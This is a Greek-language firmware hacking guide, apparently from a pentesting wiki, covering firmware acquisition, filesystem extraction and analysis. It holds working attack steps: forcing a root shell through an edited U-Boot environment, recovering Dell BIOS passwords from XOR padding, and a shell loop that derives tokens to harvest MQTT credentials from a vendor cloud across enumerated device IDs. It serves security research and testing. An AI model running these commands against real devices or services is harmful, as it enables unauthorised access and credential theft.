## **Συλλογή πληροφοριών**

Η **συλλογή πληροφοριών** είναι ένα κρίσιμο αρχικό βήμα για την κατανόηση της σύνθεσης μιας συσκευής και των τεχνολογιών που χρησιμοποιεί. Η διαδικασία περιλαμβάνει τη συλλογή δεδομένων σχετικά με:

- Την αρχιτεκτονική της CPU και το λειτουργικό σύστημα που εκτελεί
- Τα χαρακτηριστικά του bootloader
- Τη διάταξη του υλικού και τα datasheets
- Μετρικές της βάσης κώδικα και τοποθεσίες πηγαίου κώδικα
- Εξωτερικές βιβλιοθήκες και τύπους αδειών χρήσης
- Ιστορικό ενημερώσεων και κανονιστικές πιστοποιήσεις
- Αρχιτεκτονικά διαγράμματα και διαγράμματα ροής
- Αξιολογήσεις ασφαλείας και εντοπισμένες ευπάθειες

Για τον σκοπό αυτό, τα εργαλεία **open-source intelligence (OSINT)** είναι ανεκτίμητα, όπως και η ανάλυση τυχόν διαθέσιμων στοιχείων λογισμικού ανοιχτού κώδικα μέσω χειροκίνητων και αυτοματοποιημένων διαδικασιών ελέγχου. Εργαλεία όπως το [Coverity Scan](https://scan.coverity.com) και το [LGTM της Semmle](https://lgtm.com/#explore) προσφέρουν δωρεάν static analysis, την οποία μπορείτε να αξιοποιήσετε για τον εντοπισμό πιθανών προβλημάτων.

## **Απόκτηση του Firmware**

Η απόκτηση firmware μπορεί να γίνει με διάφορους τρόπους, καθένας με διαφορετικό βαθμό πολυπλοκότητας:

- **Απευθείας** από την πηγή (προγραμματιστές, κατασκευαστές)
- **Με build** βάσει των παρεχόμενων οδηγιών
- **Με λήψη** από επίσημους ιστότοπους υποστήριξης
- Με χρήση ερωτημάτων **Google dork** για τον εντοπισμό φιλοξενούμενων αρχείων firmware
- Με απευθείας πρόσβαση σε **cloud storage**, χρησιμοποιώντας εργαλεία όπως το [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Με υποκλοπή **ενημερώσεων** μέσω τεχνικών man-in-the-middle
- Με **εξαγωγή** από τη συσκευή μέσω συνδέσεων όπως **UART**, [**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash) ή **PICit**
- Με **sniffing** αιτημάτων ενημέρωσης κατά την επικοινωνία της συσκευής
- Με εντοπισμό και χρήση **hardcoded endpoint ενημερώσεων**
- Με **dumping** από τον bootloader ή μέσω δικτύου
- Με **αφαίρεση και ανάγνωση** του chip αποθήκευσης, αν αποτύχουν όλες οι άλλες μέθοδοι, χρησιμοποιώντας τα κατάλληλα εργαλεία υλικού

### Καταγραφές μόνο μέσω UART: επιβολή root shell μέσω του U-Boot env στη flash

Αν το RX του UART αγνοείται (καταγράφονται μόνο logs), μπορείτε και πάλι να επιβάλετε ένα init shell **επεξεργαζόμενοι offline το blob περιβάλλοντος του U-Boot**:<sup>[[6]](#references)</sup>

1. Κάντε dump τη SPI flash με ένα κλιπ SOIC-8 και programmer (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Εντοπίστε το partition env του U-Boot, επεξεργαστείτε το `bootargs` ώστε να περιλαμβάνει το `init=/bin/sh` και **υπολογίστε ξανά το U-Boot env CRC32** για το blob.
3. Κάντε reflash μόνο στο partition env και επανεκκινήστε· θα πρέπει να εμφανιστεί ένα shell στο UART.

Αυτό είναι χρήσιμο σε ενσωματωμένες συσκευές όπου το shell του bootloader είναι απενεργοποιημένο, αλλά το partition env είναι εγγράψιμο μέσω εξωτερικής πρόσβασης στη flash.

## Ανάλυση του firmware

Τώρα που **έχετε το firmware**, πρέπει να εξαγάγετε πληροφορίες από αυτό, ώστε να γνωρίζετε πώς να το χειριστείτε. Μερικά εργαλεία που μπορείτε να χρησιμοποιήσετε:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Αν δεν βρείτε πολλά με αυτά τα εργαλεία, ελέγξτε την **εντροπία** του image με `binwalk -E <bin>`. Αν είναι χαμηλή, τότε μάλλον δεν είναι κρυπτογραφημένο. Αν είναι υψηλή, πιθανότατα είναι κρυπτογραφημένο (ή συμπιεσμένο με κάποιον τρόπο).

Επιπλέον, μπορείτε να χρησιμοποιήσετε αυτά τα εργαλεία για να εξαγάγετε **αρχεία ενσωματωμένα στο firmware**:

### Ακατέργαστα display assets σε external flash

Ένα external SPI dump δεν είναι απαραίτητα το εκτελέσιμο firmware του MCU. Για έναν στόχο Cortex-M, συγκρίνετε την αρχή κάθε υποψήφιας περιοχής κώδικα με τον memory map της συσκευής: ένας κανονικός πίνακας διανυσμάτων ξεκινά με μια εύλογη διεύθυνση δείκτη στοίβας SRAM και μια διεύθυνση reset handler σε εκτελέσιμη μνήμη. Η απουσία πίνακα διανυσμάτων στο offset μηδέν δεν αποδεικνύει από μόνη της ότι ολόκληρο το chip δεν περιέχει κώδικα· επιθεωρήστε και άλλα offsets και τη διάταξη εκκίνησης. Αν το `binwalk` δεν εντοπίσει container, επιθεωρήστε τα raw bytes και συσχετίστε τις διευθύνσεις ανάγνωσης flash από ένα [αποκωδικοποιημένο SPI capture](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) με ενέργειες που φορτώνουν νέες οθόνες.<sup>[[14]](#references)</sup>

Για μια περιοχή display assets, δοκιμάστε υποψήφιες μορφές pixel και διαστάσεις αντί να υποθέσετε ότι πρόκειται για PNG/JPEG. Η συσκευή που αναφέρεται χρησιμοποιούσε frames **80×160 RGB565 little-endian**: με δύο bytes ανά pixel, ένα frame έχει μέγεθος **25.600 bytes** (25 KiB), όχι 24 kilobits. Μια διεύθυνση ανάγνωσης flash που αποκωδικοποιήθηκε προσδιόρισε το offset του screen asset· ο ερευνητής μετέτρεψε μια προετοιμασμένη εικόνα με `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb`, αντικατέστησε το asset ίδιου μεγέθους στο αρχικό dump, το έγραψε με `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` και επιβεβαίωσε ότι εμφανίστηκε η νέα εικόνα στην οθόνη. Αυτό αποδεικνύει ότι είναι δυνατή η εγγραφή σε *external display assets*, όχι η εξαγωγή ή η επαναφόρτωση του εσωτερικού firmware του MCU. Διατηρείτε το αρχικό dump και επαληθεύετε τις διαστάσεις, τη σειρά byte, το offset και το μήκος του asset αντικατάστασης πριν από οποιαδήποτε εγγραφή.<sup>[[14]](#references)</sup>

### Διαφορική ανάλυση flash και ανακτήσιμες αποθήκες μυστικών με XOR

Όταν μια ρύθμιση firmware δεν έχει τεκμηριωμένη μορφή αποθήκευσης, πρώτα λάβετε αρκετές αντίστοιχες αναγνώσεις flash, αλλάξτε **ακριβώς μία** ρύθμιση, κάντε ξανά dump ολόκληρου του chip και συγκρίνετε τα offsets. Η επανάληψη του πειράματος με ελεγχόμενες τιμές βοηθά να ξεχωρίσετε τη ρύθμιση από μετρητές και metadata εγγραφής· αλλαγές σε νέα offsets αντί για επιτόπου υποδεικνύουν αποθήκη append-only ή log-structured. Διατηρείτε τις διαγραμμένες/tombstoned εγγραφές, καθώς τα payload bytes τους ενδέχεται να είναι ακόμη ανακτήσιμα.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Αφού εντοπίσετε την περιοχή, εξαγάγετε τα firmware modules με εργαλεία όπως το `binwalk` και κάντε reverse engineering της συνάρτησης εγγραφής/επικύρωσης στο Ghidra. Επιβεβαιώστε στον κώδικα τα όρια των πεδίων, το padding, την αρίθμηση των κλειδιών και την παραγωγή του κλειδιού, αντί να συμπεράνετε το σχήμα μόνο από τα μοτίβα του ciphertext.<sup>[[12]](#references)</sup>

#### Ανάκτηση κλειδιών από κρυπτογραφημένο padding μηδενικών

Όπως περιγράφεται στην [κρυπτογράφηση βασισμένη σε XOR](../../crypto/symmetric/#xor-based-encryption), το γνωστό plaintext αποκαλύπτει bytes του keystream στις ίδιες θέσεις. Ένα πεδίο σταθερού μεγέθους είναι ιδιαίτερα εκτεθειμένο όταν το padding μηδενικών του καλύπτει όλους τους δείκτες ενός επαναλαμβανόμενου κλειδιού XOR: το κρυπτογραφημένο padding αποκαλύπτει απευθείας αυτά τα bytes του κλειδιού, επειδή `0x00 XOR key_byte = key_byte`. Αν καλύπτονται όλοι οι δείκτες του κλειδιού, ανακατασκευάστε το κλειδί από το τέλος του ciphertext και αποκρυπτογραφήστε τα bytes που περιέχουν δεδομένα.<sup>[[12]](#references)</sup>

Η ευάλωτη μορφή κωδικού πρόσβασης BIOS DVAR της Dell είναι ένα συγκεκριμένο παράδειγμα: το byte `0` ενός πεδίου 32 bytes είναι plaintext, ενώ τα bytes `1..31` χρησιμοποιούν ένα επαναλαμβανόμενο κλειδί 20 bytes.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Για μήκος password `L`, οι θέσεις `L..31` ήταν μηδενικές πριν από το XOR. Όταν `L <= 12`, αυτές οι θέσεις καλύπτουν κάθε δείκτη κλειδιού, οπότε ανακτώνται ολόκληρο το κλειδί και το password χωρίς brute force:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Ανάκτηση κλειδιών από ιστορικές εγγραφές

Μην αναλύετε κάθε εγγραφή ανεξάρτητα. Το κλειδί DVAR προκύπτει περίπου ως `modified_md5(device_seed || variable_GUID || password[0])`: το device seed και το GUID είναι σταθερά, ενώ η μόνη είσοδος που εξαρτάται από τον κωδικό πρόσβασης είναι το πρώτο byte σε καθαρή μορφή. Έτσι, υπάρχουν το πολύ 256 κλειδιά ανά συσκευή, και οι εγγραφές που αρχίζουν με το ίδιο byte μοιράζονται το ίδιο κλειδί. Ομαδοποιήστε τις ενεργές και τις διαγραμμένες εγγραφές βάσει αυτού του byte· μια σύντομη ιστορική εγγραφή μπορεί να διαρρεύσει ολόκληρο το κλειδί μέσω του padding και να αποκρυπτογραφήσει μια τρέχουσα, μεγαλύτερη εγγραφή, της οποίας το padding από μόνο του δεν επαρκεί. Επομένως, η αλλαγή κωδικού πρόσβασης μπορεί να αυξήσει την έκθεση, όταν το παλιό ciphertext σημειώνεται ως διαγραμμένο αντί να διαγράφεται οριστικά.<sup>[[12]](#references)</sup>

Το εργαλείο [`dellpwn`](https://github.com/R3n5k1/dellpwn) εντοπίζει το DVAR, επικυρώνει υποψήφιες εγγραφές, ανακτά κωδικούς πρόσβασης και μπορεί να εμφανίσει τα ακατέργαστα αποθηκευμένα byte/byte κλειδιού. Δημιουργήστε το από ένα checkout και σαρώστε μια επαληθευμένη εικόνα flash ως εξής:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Για custom parsers, απορρίψτε τα false positives με βάση τη δομή των εγγραφών, τους περιορισμούς εκτυπώσιμων χαρακτήρων, τους ελέγχους zero-padding, την εντροπία του key και τη συνέπεια στα σημεία όπου γίνεται wrap το key. Αν επαναλαμβανόμενα dumps δείχνουν αραιές αλλαγές bit ανά εγγραφή, καταγράψτε τις μάσκες που παρατηρήθηκαν και κατατάξτε τις διορθώσεις με βάση αυτούς τους περιορισμούς, αλλά αναφέρετε τους αμφίσημους χαρακτήρες αντί να παρουσιάζετε την ευρετική έξοδο ως ακριβή ανάκτηση.<sup>[[12]](#references)</sup>

Οι επαληθευτές κωδικών πρόσβασης θα πρέπει να αποθηκεύουν ένα salted, επαναληπτικό μονόδρομο hash αντί για αναστρέψιμο ciphertext, ενώ τα log-structured stores θα πρέπει να αφαιρούν με ασφάλεια το υλικό μυστικών που έχει αντικατασταθεί.<sup>[[12]](#references)</sup>

### Απόκτηση του συστήματος αρχείων

Με τα εργαλεία που αναφέρθηκαν προηγουμένως, όπως το `binwalk -ev <bin>`, θα έπρεπε να μπορέσατε να **εξαγάγετε το σύστημα αρχείων**.\
Το Binwalk συνήθως το εξάγει σε έναν **φάκελο με όνομα τον τύπο του συστήματος αρχείων**, ο οποίος συνήθως είναι ένας από τους εξής: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Μη αυτόματη εξαγωγή συστήματος αρχείων

Μερικές φορές, το binwalk **δεν έχει το magic byte του συστήματος αρχείων στις υπογραφές του**. Σε αυτές τις περιπτώσεις, χρησιμοποιήστε το binwalk για να **εντοπίσετε το offset του συστήματος αρχείων και να κάνετε carve το συμπιεσμένο σύστημα αρχείων** από το binary και να **εξαγάγετε μη αυτόματα** το σύστημα αρχείων σύμφωνα με τον τύπο του, ακολουθώντας τα παρακάτω βήματα.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Εκτελέστε την ακόλουθη **εντολή dd** για να κάνετε carving του συστήματος αρχείων Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Εναλλακτικά, θα μπορούσε να εκτελεστεί και η ακόλουθη εντολή.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Για squashfs (που χρησιμοποιείται στο παραπάνω παράδειγμα)

`$ unsquashfs dir.squashfs`

Τα αρχεία θα βρίσκονται στη συνέχεια στον κατάλογο "`squashfs-root`".

- Αρχεία αρχειοθήκης CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Για συστήματα αρχείων jffs2

`$ jefferson rootfsfile.jffs2`

- Για συστήματα αρχείων ubifs με NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Ανακατασκευή διαχωρισμένων embedded root filesystems

Αν ένα raw eMMC/SSD dump περιέχει έγκυρη κεφαλίδα συστήματος αρχείων, αλλά οι μετατοπίσεις των metadata εκτείνονται πέρα από το ονομαστικό partition, μην το χαρακτηρίσετε αμέσως ως κατεστραμμένο. Ο embedded κώδικας εκκίνησης μπορεί να συναρμολογεί την πραγματική root device από πολλαπλές φυσικές περιοχές με το Device Mapper, οπότε η εξαγωγή δεδομένων από ένα partition GPT αποδίδει μόνο το πρώτο τμήμα.<sup>[[9]](#references)</sup>

#### Αρχική αξιολόγηση της πλήρους εικόνας του μέσου

Αρχικά, επαληθεύστε ότι η απόκτηση έχει ολοκληρωθεί, το μέγεθος είναι σταθερό και καμία διεργασία εγγραφής δεν χρησιμοποιεί πλέον την εικόνα. Αν το όνομα του αρχείου κωδικοποιεί διεύθυνση έναρξης/λήξης, συγκρίνετε αυτό το εύρος με τον πραγματικό αριθμό byte. Ανακτήστε το GPT σε λειτουργία μόνο για ανάγνωση και προσαρτήστε μόνο το απαιτούμενο εύρος· **μην** εκτελέσετε `vgchange -ay` σε μη έμπιστο φυσικό τόμο στον σταθμό εργασίας, καθώς μπορεί να προκύψουν συγκρούσεις ομάδων τόμων και ακούσιες εγγραφές.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Προτίμησε μια προσωρινή VM όταν η αρχική λογική init ή μια στοίβα LVM πρέπει να έχει πρόσβαση σε ολόκληρο το image. Τα ιστορικά boot logs από ένα τυπικό boot partition είναι ιδιαίτερα χρήσιμα: το bootloader μπορεί να έχει καταγράψει offsets proprietary container, μήκη components, επιλογή slot, κανόνες ευθυγράμμισης και επαλήθευση signature. Χρησιμοποίησε αυτές τις τιμές για να απομονώσεις μια ενσωματωμένη command line/kernel/initramfs και, στη συνέχεια, επαλήθευσε ανεξάρτητα κάθε έξοδο με `file`, magic bytes και `binwalk`. Η ανάγνωση μέχρι το τέλος του container μπορεί κατά λάθος να προσθέσει ένα initrd, ένα αντικείμενο ACPI ή μια signature στο kernel.<sup>[[9]](#references)</sup>

#### Ανάκτησε το block map κατά την εκκίνηση

Εξήγαγε το initramfs του kernel και κάνε reverse engineering στο `/init` και σε τυχόν storage libraries. Στο [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/), ακολούθησε τις αναφορές συμβολοσειρών για τα `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` και τα paths των partitions. Έπειτα, εντόπισε τον κώδικα που επιλέγει το ενεργό A/B slot και δημιουργεί τον πίνακα. Χρήσιμα σημεία εκκίνησης στο radare2 είναι τα `r2 -A init`, `afl`, `pdf @ main` και `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Ο linear target αντιστοιχίζει διαδοχικά εύρη μιας εικονικής συσκευής σε εύρη μίας ή περισσότερων backing devices. Ένας ανακτημένος πίνακας δύο τμημάτων έχει συνήθως την εξής μορφή (όλες οι θέσεις και τα μήκη είναι σε τομείς των 512 byte):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Αναπαράγετε με ακρίβεια την αριθμητική του κώδικα μηχανής, συμπεριλαμβανομένων του πλάτους των ακεραίων, των μετατοπίσεων και των μετατροπών μονάδων. Για παράδειγμα, η ακόλουθη έκφραση στρογγυλοποιεί προς τα κάτω ένα μέγεθος byte σε όριο 4 KiB και μόνο μετά το μετατρέπει σε τομείς των 512 byte· αν την αντικαταστήσετε με `p4_bytes // 512`, η επιλεγμένη ουρά μετατοπίζεται κατά `p4_bytes % 4096` όταν το partition δεν είναι ευθυγραμμισμένο σε όριο σελίδας.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Ανακατασκευάστε μια επίπεδη εικόνα ανάλυσης αντιγράφοντας τα εύρη με τη σειρά του πίνακα, σε περιορισμένα chunks αντί να φορτώσετε ολόκληρο το media dump στη μνήμη. Έτσι αποφεύγετε επίσης τη δημιουργία mapper devices στην πλευρά του host. Διατηρήστε τα offsets που προκύπτουν από το GPT, τους αντίστροφους αριθμούς sector και το μήκος του παραγόμενου output ως ξεχωριστές assertions.<sup>[[9]](#references)</sup>

#### Διακρίνετε την αλλοίωση από ένα σταθερό σφάλμα ανακατασκευής

Για το SquashFS, ελέγξτε το magic `hsqs` και αποκωδικοποιήστε το little-endian πεδίο `bytes_used` των 64 bit στη μετατόπιση 40 του superblock πριν εκτελέσετε το `unsquashfs`. Αν η εξαγωγή αποτυγχάνει σε πολλές άσχετες δομές, αναζητήστε σε ένα ευρύ παράθυρο γύρω από τις αναμενόμενες θέσεις και απαιτήστε ισχυρά δομικά στοιχεία: ένα block μεταδεδομένων που μπορεί να αποσυμπιεστεί, αρκετές διαδοχικές έγκυρες εγγραφές καταλόγου, εύλογα πεδία inode, ένα root inode συμβατό με τον αριθμό των inode ή έγκυρη δομή μεταδεδομένων ακεραιότητας. Μία μόνο αντιστοιχία magic δεν αρκεί.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Όταν το ίδιο signed delta καθιστά έγκυρες ανεξάρτητες δομές —για παράδειγμα, τα μεταδεδομένα καταλόγου και μια εγγραφή verity— η πιθανότερη αιτία είναι ένα συστηματικό σφάλμα στην αρχή του segment και όχι bytes που λείπουν. Επιστρέψτε στην αντίστροφη αριθμητική και αναζητήστε απορριφθέντα υπόλοιπα, signedness, overflow ή στρογγυλοποίηση σε όρια sector/page πριν επιχειρήσετε ανάκτηση orphan ή patching των μεταδεδομένων του filesystem.<sup>[[9]](#references)</sup>

Τέλος, διατηρήστε ξεχωριστά τα όρια προστασίας: οι τόμοι LUKS που είναι sealed με TPM προστατεύουν την εμπιστευτικότητα των δεδομένων, ενώ ένα signed dm-verity mapping προστατεύει την ακεραιότητα του root filesystem. Ένα software TPM δεν ανακτά ένα κλειδί που έχει sealed στο αρχικό φυσικό TPM, και η εκκίνηση ενός τροποποιημένου SquashFS μέσω ενός init μόνο για έρευνα, το οποίο παραλείπει την επαλήθευση verity, δεν πλαστογραφεί την υπογραφή του ούτε παρακάμπτει το dm-verity.<sup>[[9]](#references)</sup>

## Ανάλυση Firmware

Μόλις αποκτηθεί το firmware, είναι απαραίτητο να το αναλύσετε για να κατανοήσετε τη δομή του και τις πιθανές ευπάθειες. Αυτή η διαδικασία περιλαμβάνει τη χρήση διαφόρων εργαλείων για την ανάλυση και την εξαγωγή πολύτιμων δεδομένων από το image του firmware.

### Εργαλεία αρχικής ανάλυσης

Παρακάτω παρέχεται ένα σύνολο εντολών για την αρχική επιθεώρηση του binary αρχείου (που αναφέρεται ως `<bin>`). Αυτές οι εντολές βοηθούν στον εντοπισμό τύπων αρχείων, στην εξαγωγή strings, στην ανάλυση binary δεδομένων και στην κατανόηση των λεπτομερειών των partitions και του filesystem:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Για να αξιολογηθεί η κατάσταση κρυπτογράφησης της εικόνας, ελέγχεται η **εντροπία** με την εντολή `binwalk -E <bin>`. Η χαμηλή εντροπία υποδηλώνει απουσία κρυπτογράφησης, ενώ η υψηλή εντροπία υποδηλώνει πιθανή κρυπτογράφηση ή συμπίεση.

Για την εξαγωγή **ενσωματωμένων αρχείων**, συνιστώνται εργαλεία και πόροι όπως η τεκμηρίωση **file-data-carving-recovery-tools** και το **binvis.io** για επιθεώρηση αρχείων.

### Εξαγωγή του Συστήματος Αρχείων

Με την εντολή `binwalk -ev <bin>`, συνήθως μπορεί κανείς να εξαγάγει το σύστημα αρχείων, συχνά σε έναν κατάλογο που ονομάζεται σύμφωνα με τον τύπο του συστήματος αρχείων (π.χ. squashfs, ubifs). Ωστόσο, όταν το **binwalk** δεν αναγνωρίζει τον τύπο του συστήματος αρχείων λόγω απουσίας magic bytes, απαιτείται χειροκίνητη εξαγωγή. Αυτό περιλαμβάνει τη χρήση του `binwalk` για τον εντοπισμό της θέσης του συστήματος αρχείων και στη συνέχεια της εντολής `dd` για την αποκοπή του συστήματος αρχείων:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Στη συνέχεια, ανάλογα με τον τύπο του συστήματος αρχείων (π.χ. squashfs, cpio, jffs2, ubifs), χρησιμοποιούνται διαφορετικές εντολές για τη χειροκίνητη εξαγωγή των περιεχομένων.

### Ανάλυση συστήματος αρχείων

Αφού εξαχθεί το σύστημα αρχείων, ξεκινά η αναζήτηση για αδυναμίες ασφαλείας. Εξετάζονται μη ασφαλείς network daemons, hardcoded διαπιστευτήρια, API endpoints, λειτουργίες διακομιστών ενημερώσεων, μη μεταγλωττισμένος κώδικας, scripts εκκίνησης και μεταγλωττισμένα binaries για offline analysis.

**Βασικές τοποθεσίες** και **στοιχεία** προς επιθεώρηση περιλαμβάνουν:

- Τα **etc/shadow** και **etc/passwd** για διαπιστευτήρια χρηστών
- Πιστοποιητικά και κλειδιά SSL στο **etc/ssl**
- Αρχεία ρυθμίσεων και scripts για πιθανές ευπάθειες
- Ενσωματωμένα binaries για περαιτέρω ανάλυση
- Συνήθεις web servers και binaries συσκευών IoT

Πολλά εργαλεία βοηθούν στον εντοπισμό ευαίσθητων πληροφοριών και ευπαθειών μέσα στο σύστημα αρχείων:

- Τα [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) και [**Firmwalker**](https://github.com/craigz28/firmwalker) για αναζήτηση ευαίσθητων πληροφοριών
- Το [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) για ολοκληρωμένη ανάλυση firmware
- Τα [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) και [**EMBA**](https://github.com/e-m-b-a/emba) για στατική και δυναμική ανάλυση

### Έλεγχοι ασφαλείας σε μεταγλωττισμένα binaries

Τόσο ο πηγαίος κώδικας όσο και τα μεταγλωττισμένα binaries που βρίσκονται στο σύστημα αρχείων πρέπει να ελέγχονται προσεκτικά για ευπάθειες. Εργαλεία όπως το **checksec.sh** για binaries Unix και το **PESecurity** για binaries Windows βοηθούν στον εντοπισμό μη προστατευμένων binaries που θα μπορούσαν να αποτελέσουν στόχο εκμετάλλευσης.

## Συλλογή cloud config και διαπιστευτηρίων MQTT μέσω URL tokens που προκύπτουν από υπολογισμό

Πολλά IoT hubs ανακτούν τις ρυθμίσεις κάθε συσκευής από ένα cloud endpoint που έχει τη μορφή:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Κατά την ανάλυση firmware, μπορεί να διαπιστώσετε ότι το `<token>` προκύπτει τοπικά από το αναγνωριστικό της συσκευής, χρησιμοποιώντας ένα hardcoded μυστικό, για παράδειγμα:

- token = MD5( deviceId || STATIC_KEY ) και αναπαρίσταται ως κεφαλαίο hex

Αυτός ο σχεδιασμός επιτρέπει σε οποιονδήποτε γνωρίζει ένα deviceId και το STATIC_KEY να ανακατασκευάσει το URL και να ανακτήσει τις cloud ρυθμίσεις, οι οποίες συχνά αποκαλύπτουν διαπιστευτήρια MQTT σε απλό κείμενο και προθέματα topic.

Πρακτική ροή εργασίας:

1) Εξαγωγή του deviceId από τα αρχεία καταγραφής εκκίνησης UART

- Συνδέστε έναν προσαρμογέα UART 3.3V (TX/RX/GND) και καταγράψτε τα αρχεία καταγραφής:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Αναζητήστε γραμμές που εκτυπώνουν το μοτίβο URL του cloud config και τη διεύθυνση του broker, για παράδειγμα:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Ανάκτηση του STATIC_KEY και του αλγορίθμου token από το firmware

- Φόρτωσε τα binaries στο Ghidra/radare2 και αναζήτησε τη διαδρομή config ("/pf/") ή χρήση του MD5.
- Επιβεβαίωσε τον αλγόριθμο (π.χ., MD5(deviceId||STATIC_KEY)).
- Παράγαγε το token στο Bash και μετέτρεψε το digest σε κεφαλαία:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Συλλογή ρυθμίσεων cloud και διαπιστευτηρίων MQTT

- Συνθέστε το URL και ανακτήστε το JSON με curl· αναλύστε το με jq για να εξαγάγετε μυστικά:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Εκμεταλλευτείτε το MQTT σε απλό κείμενο και τα αδύναμα ACLs θεμάτων (αν υπάρχουν)

- Χρησιμοποιήστε τα ανακτημένα διαπιστευτήρια για να εγγραφείτε σε θέματα συντήρησης και να αναζητήσετε ευαίσθητα συμβάντα:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Απαρίθμηση προβλέψιμων ID συσκευών (σε μεγάλη κλίμακα, με εξουσιοδότηση)

- Πολλά οικοσυστήματα ενσωματώνουν bytes OUI/προϊόντος/τύπου του κατασκευαστή, ακολουθούμενα από ένα διαδοχικό επίθημα.
- Μπορείτε να δοκιμάζετε διαδοχικά πιθανά ID, να παράγετε tokens και να ανακτάτε ρυθμίσεις μέσω προγραμματισμού:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Σημειώσεις
- Να λαμβάνετε πάντα ρητή εξουσιοδότηση πριν επιχειρήσετε μαζική enumeration.
- Όπου είναι δυνατό, προτιμήστε emulation ή static analysis για την ανάκτηση μυστικών χωρίς τροποποίηση του hardware-στόχου.

